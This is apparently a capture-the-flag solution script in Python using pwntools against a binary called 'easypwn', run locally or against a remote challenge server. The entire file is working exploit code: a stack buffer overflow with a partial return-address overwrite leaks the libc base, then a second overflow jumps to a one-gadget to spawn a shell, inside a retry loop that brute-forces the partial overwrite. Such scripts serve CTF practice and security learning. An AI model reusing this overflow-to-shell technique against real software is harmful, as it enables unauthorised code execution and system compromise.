#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

#gdb.attach(p)

def ret2main():
    ###leak base&&ret2main###
    payload = 'A' * 0x88 + '\x51' + '\x13'
    sl(payload)
    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x0000000000021351
    success("libc_base:"+hex(libc_base))
    return libc_base

while(1):
    if(sys.argv[1] == 'l'):
        p = process('./easypwn')
        elf = ELF('./easypwn',checksec=False)
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

    else:
        p = remote("nc.eonew.cn","10004")
        elf = ELF('./easypwn',checksec=False)
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

    try:
        libc_base = ret2main()
        system = libc_base + 0x4f322
        sh = libc_base + libc.search('/bin/sh').next()
        pop_rdi_ret = libc_base + 0x000000000002155f
        success("system:"+hex(system))
        success("bin:"+hex(sh))


        sleep(0.3)
        payload = 'A' * 0x88 + p64(system)
        sl(payload)
        sl('ls')
        
        ia()
    except:
        pass